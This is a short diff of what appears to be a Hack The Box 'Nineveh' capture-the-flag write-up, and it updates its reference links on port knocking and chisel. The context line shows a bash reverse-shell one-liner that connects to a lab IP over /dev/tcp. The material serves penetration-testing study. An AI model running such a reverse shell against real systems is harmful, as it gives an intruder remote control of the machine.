@@ -216,7 +216,7 @@ bash -i >& /dev/tcp/10.10.14.18/5555 0>&1
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/fd0fdf8a-98b4-43b5-af22-3482b41eafe9)
 
 # References & Alternatives:
-Try ssh connection [analyzing **secure_notes** image file](https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/nineveh-writeup-w-o-metasploit#id-7b47) and [port knocking](https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/nineveh-writeup-w-o-metasploit#id-7b47) methods for more alternatives.
+Try ssh connection [analyzing **secure_notes** image file](https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/nineveh-writeup-w-o-metasploit#id-7b47) and port knocking [1](https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/nineveh-writeup-w-o-metasploit#id-7b47)  [2](https://benheater.com/hackthebox-nineveh/#knock-on-the-door)  [3-chisel](https://benheater.com/hackthebox-nineveh/#port-knock-workaround-chisel) methods for more alternatives.
 + https://vvmlist.github.io/#nineveh
 + https://0xdf.gitlab.io/2020/04/22/htb-nineveh.html
 + https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/nineveh-writeup-w-o-metasploit
